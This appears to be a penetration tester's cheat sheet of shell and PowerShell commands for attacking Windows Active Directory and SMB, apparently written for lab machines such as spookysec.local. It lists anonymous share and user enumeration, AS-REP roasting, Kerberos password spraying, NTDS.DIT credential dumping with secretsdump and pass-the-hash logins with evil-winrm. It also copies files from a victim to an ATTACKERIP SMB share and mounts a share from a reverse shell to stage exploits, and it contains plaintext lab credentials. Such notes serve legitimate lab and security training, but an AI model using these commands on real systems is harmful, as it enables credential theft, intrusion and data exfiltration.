This file is for enumerating Active Directory/LDAP and SMB.

[*] Use to enumerate smb:
        rpcclient -U '' <IP addr>
            enumdomusers
            querydispinfo
            queryuser <RID id, like 0x045>
        crackmapexec smb <ip addr> -u '' -p '' --shares
        crackmapexec smb <ip addr> -u '<username>' -p '<password>'
	crackmapexec smb <ip addr> -u '<username>' -p '<password>' --users
        crackmapexec winrm <ip addr> -u '<username>' -p '<password>'
        poetry run crackmapexec smb <ip addr>
	poetry run crackmapexec smb <ip addr> --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --pass-pol
	poetry run crackmapexec smb <ip addr> -u '' -p '' --users
	poetry run crackmapexec smb <ip addr> -u '' -p '' -M spider_plus
	poetry run crackmapexec smb <ip addr> -u '' -p '' --get-file \\share\file.txt file.txt
		# If file download fails, try another tool.
		smbclient -N //ip_addr/share
		get file.txt
		mget * # get all the files
        smbclient -U '' -L <ip addr>
	smbclient -L <ip addr>
	smbclient \\\\10.10.10.10\sharename
	smbclient -U svc-admin%management2005 -L //spookysec.local

[*] Create random password list with known words:
        hashcat --force <password file> -r /usr/share/hashcat/rules/best64.rule --stdout > <file name>

[*] Attempt to figure out the password policy - avoid lockout on bruteforce
    crackmapexec smb <IP addr> --password-pol

[*] Use to enumerate LDAP/AD:
        ldapsearch -x -h <ip addr> -s base namingcontexts
        ldapsearch -x -h <ip addr> -s sub -b '<DC=domain,DC=com>'

[*] Tool impacket is best installed in a virtual environment if not installed on OS already.
	virtualenv -p python3 impacket-github
	source impacket-github/bin/activate
	git clone https://github.com/SecureAuthCorp/impacket.git
	cd ~/git/impacket
	pip install -r requirements.txt
	python setup.py install

[*] Impacket as smb server
	impacket-smbserver -smb2support -user iamauser -password iamapassword share $(pwd) # current working directory as share

[*] SMB enumerate steps:
	smbmap -H IPADDR
	smbmap -H IPADDR -u anonymous


[*] spin up an smb server on Kali - transfer files to/from Windows and Kali
        sudo impact-smbserver -smb2support <share-name> </path/to/share>
        sudo impact-smbserver -smb2support iamawesomeshare $(pwd)
        sudo impact-smbserver -username iamusername -password iampassword IamSomeShare $(pwd)
	sudo smbserver.py -user username -password password -smb2upport share $(pwd)

[*] Copy files from Windows to our Kali SMB server
	net use Z: \\ATTACKERIP\filename.txt /user:iamusername iampassword
	copy filename.txt Z: # File will now be in SMB share


[*] Query Kerberos for ASReproastable accounts, you just need a valid account name to test.
	./GetNPUsers.py spookysec.local/svc-admin

[*] Part of impacket tools in github, use with credentials to pull passwords
./secretsdump.py hostname/user:password@hostname
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets


[*] Once a shell has spawned on victim, create a mountable share (must use PowerShell)
        $pass = "iampassword" | ConvertTo-SecureString -AsPlainText -Force
        $pass # We should see some type of System.Security.Securestring
        $cred = New-Object System.Management.Automation.PsCredential('iamsomeusername', $pass)
        $cred # We should get our object printed with password as System.Security.SecureString
        New-PSDrive -name iamusername -root \\10.10.10.10\IamSomeShare -Credential $cred -PSProvider "filesystem"
             Go back to your Kali machine, scp/rsync your priv esc scripts or exploits to the smb share directory.
             Go bck to your Windows reverse shell and start attacking.
        .\winPEAS.exe cmd fat > winPEASfast.txt
             This is now in your smb share, stored on your Kali machine

[*] Useful smb commands for connecting
	smbclient -N //10.10.10.10/share
	smbclient -U anonymous //10.10.10.10/share
	smbclient \\\\spookysec.local\\backup -U svc-admin
		You will be prompted for password, unless you supply -N flag

[*] Kerbrute tool - bruteforce users, password, and spray passwords
	https://github.com/ropnop/kerbrute/releases
	chmod 755 kerbrute_linux_amd64
- Examples running the tool
	./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local userlist.txt


[*] Install evil-winrm
	sudo gem install evil-winrm

- Connect to remote host with a hash instead of password
	evil-winrm -i 10.10.10.10 -u hostname.local\\Administrator -H <hash>
